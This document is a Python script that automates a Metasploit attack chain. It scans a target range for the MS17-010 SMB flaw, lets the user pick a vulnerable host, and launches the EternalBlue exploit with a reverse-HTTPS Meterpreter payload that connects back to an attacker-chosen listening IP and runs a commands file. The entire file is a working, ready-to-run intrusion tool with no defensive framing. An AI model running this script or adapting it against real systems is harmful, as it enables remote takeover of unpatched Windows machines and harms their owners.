#!/usr/bin/python3

import os, sys, socket, re
from os import system

try:
	IPs_to_hack = []


	def get_local_ip():
		ip = input("Enter the listening IP: ")
		return ip


	def attack(target):
		attack_cmd = 'msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; spool ' + spool_log + '; set RHOST ' + target + \
					 '; set PAYLOAD windows/x64/meterpreter/reverse_https; set LHOST ' + local_ip + '; set AutoRunScript multi_console_command -r' \
					 + os.path.join(os.getcwd(), command_file) + '; show options; run;"'
		print(attack_cmd)
		os.system(attack_cmd)


	def parse_scan_log(scan_log):
		global IPs_to_hack

		scannerFile = open(scan_log, "r")

		for line in scannerFile.readlines():
			if "Host is likely VULNERABLE" in line:
				get_ip = re.findall("[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}", line)
				IPs_to_hack.append(get_ip[0])

		print(IPs_to_hack)


	if len(sys.argv) != 2:
		print("Expected one argument, found" + str(len(sys.argv) - 1))
		sys.exit()

	targets = sys.argv[1]
	scan_log = "scanner.log"
	spool_log = "spool.log"
	command_file = "commands.rc"
	scan_cmd = 'msfconsole -q -x "use auxiliary/scanner/smb/smb_ms17_010; set RHOSTS ' + targets + '; show options; run; exit" | tee ' + scan_log
	local_ip = get_local_ip()

	print("Target IP Address(es):", targets)
	print("Local IP address:", local_ip)
	print("Scanning for vulnerable hosts...")
	print(scan_cmd)

	os.system(scan_cmd)

	parse_scan_log(scan_log)

	exploitable = len(IPs_to_hack) > 0

	if not exploitable:
		print("No vulnerable targets")
		sys.exit()

	print("Found targets...")

	target = IPs_to_hack[0]

	if exploitable > 0:
		while True:
			print("Which IP would you like to hAcK?")
			n = 1
			for ip in IPs_to_hack:
				print(str(n) + ") " + str(ip))
				n += 1

			result = input("Enter a number: ")
			try:
				num = int(result)
				if (num <= len(IPs_to_hack) and num > 0):
					target = IPs_to_hack[num - 1]
					break
				print("Invalid input, try again")
			except ValueError:
				print("Invalid input, try again")

	print("Attacking target IP: " + target)
	attack(target)

except KeyboardInterrupt:
	print("\n\n")
	back = input("Do you want to EXIT (y/n): ")
	if back == 'n' or back == 'N':
		system('./Attacking/main.py')
	else:
		system('./main.py')
except:
    print("Unexpected error try again")